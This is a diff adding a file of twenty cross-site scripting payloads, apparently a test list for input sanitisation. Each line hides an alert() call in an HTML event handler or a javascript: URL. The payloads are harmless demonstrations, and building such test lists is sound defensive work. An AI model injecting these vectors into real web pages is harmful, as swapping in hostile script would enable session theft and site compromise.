@@ -1,0 +1,20 @@
+<img src="x" onerror="alert('XSS1')">
+<body onload="alert('XSS2')">
+<svg onload="alert('XSS3')">
+<iframe src="javascript:alert('XSS4')"></iframe>
+<a href="#" onclick="alert('XSS5')">Click me</a>
+<div onmouseover="alert('XSS6')">Hover over me</div>
+<input type="text" onfocus="alert('XSS7')">
+<button onclick="alert('XSS8')">Click me</button>
+<form onsubmit="alert('XSS9')"><input type="submit"></form>
+<textarea oninput="alert('XSS10')"></textarea>
+<select onchange="alert('XSS11')"><option>Option 1</option></select>
+<video onplay="alert('XSS12')"><source src="movie.mp4" type="video/mp4"></video>
+<audio oncanplay="alert('XSS13')" src="audio.mp3"></audio>
+<div onscroll="alert('XSS14')" style="height: 100px; overflow: auto;">Scroll me</div>
+<img src="x" onload="alert('XSS15')">
+<div ondblclick="alert('XSS16')">Double click me</div>
+<p oncontextmenu="alert('XSS17')">Right click me</p>
+<form onreset="alert('XSS18')"><input type="reset"></form>
+<div onwheel="alert('XSS19')" style="height: 100px; overflow: auto;">Scroll me</div>
+<marquee onstart="alert('XSS20')">XSS</marquee>
